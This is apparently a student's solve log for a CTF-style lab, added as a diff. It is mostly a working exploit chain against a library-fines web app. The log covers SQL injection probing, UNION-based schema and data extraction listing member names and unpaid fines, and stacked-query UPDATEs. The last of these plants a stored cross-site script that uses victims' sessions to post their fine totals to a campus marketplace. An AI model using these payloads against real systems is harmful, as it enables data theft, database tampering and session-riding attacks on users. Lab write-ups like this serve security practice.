@@ -1,0 +1,90 @@
+My Solves:
+
+A1
+
+
+4100001
+
+1) rahman-41' AND '1'='1
+2) rahman-41' AND '1'='0
+
+3)rahman-41' ORDER BY 5 LIMIT 1 -- -
+	so 4 columns
+
+4) ' union select 1,2,3,4 -- - (2,3,4 shown)
+
+5) ' union select 1,'',GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=DATABASE() -- - 
+	fine_record,log,member
+
+
+6) ' union select 1,'',GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='fine_record' -- -
+=>fine_id,member_id,amount,status,reason
+7) ' union select 1,'',GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='member' -- -
+
+=>member_id,first_name,last_name,pin
+8) ' union select 1,'',GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='log' -- -
+
+=>id,submitted_id,submitted_secret,attempted_at
+
+9)' union select 1,'',GROUP_CONCAT(DISTINCT fine_record.status),4 FROM fine_record -- -
+
+=> PAID,UNPAID
+
+10) Seeing type 
+	
+' UNION SELECT 1, 2, GROUP_CONCAT(column_name, ':', data_type), 4 
+FROM information_schema.columns 
+WHERE table_name = 'fine_record' -- -
+
+2 fine_id:int,member_id:int,amount:decimal,status:enum,reason:varchar
+
+11) ' union select 1,'',GROUP_CONCAT(ID ,' ',fn,' ',' ',ln,':',total SEPARATOR '<br>' ),' ' FROM ( 
+
+SELECT m.member_id as ID , m.first_name as fn , m.last_name as ln, COALESCE(SUM(CASE 
+WHEN f.status='UNPAID' THEN f.amount
+ELSE 0
+END),0) as total
+FROM member m
+LEFT JOIN fine_record f
+ON m.member_id=f.member_id 
+GROUP BY m.member_id,m.first_name,m.last_name
+) AS agg -- -
+
+=>
+4100001 Anika Rahman:20.25
+4100002 Farhan Karim:41.50
+4100003 Mehjabin Sultana:0.00
+4100004 Tahmid Hasan:22.65
+4100005 Nusrat Jahan:67.00
+4100006 Samin Hossain:10.00
+4100007 Afsana Kabir:0.00
+4100008 Rayhan Ahmed:24.00
+4100009 Tasnim Akter:14.00
+4100010 Adnan Mahmud:33.30
+4100011 Fariha Noor:6.75
+4100012 Abrar Siddique:48.90
+4100013 Lamisa Haque:0.00
+4100014 Zarif Uddin:40.00
+4100015 Maliha Khan:7.00
+
+
+
+
+12)rahman-41'; UPDATE member SET last_name='<b>Hello</b>'; -- -
+=>Anika Hello	$20.25
+
+13)
+
+rahman-41'; UPDATE member m SET last_name = CONCAT('<script>fetch("http://localhost:4001/list", {method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, credentials: "include", body: "title=I+owe+%24', (SELECT COALESCE(SUM(amount), 0) FROM fine_record f WHERE f.member_id = m.member_id AND f.status='UNPAID'), '+in+fines&price=', (SELECT COALESCE(SUM(amount), 0) FROM fine_record f WHERE f.member_id = m.member_id), '"});</script>'); -- -
+
+=>Login as 410001 and this as password
+sets the script
+
+after that when logging in with any legititate id and password with logged in campus marketplace
+posts this
+Anika Rahman
+I owe $20.25 in fines - $40.25
+
+Farhan Karim
+I owe $41.50 in fines - $49.75
+
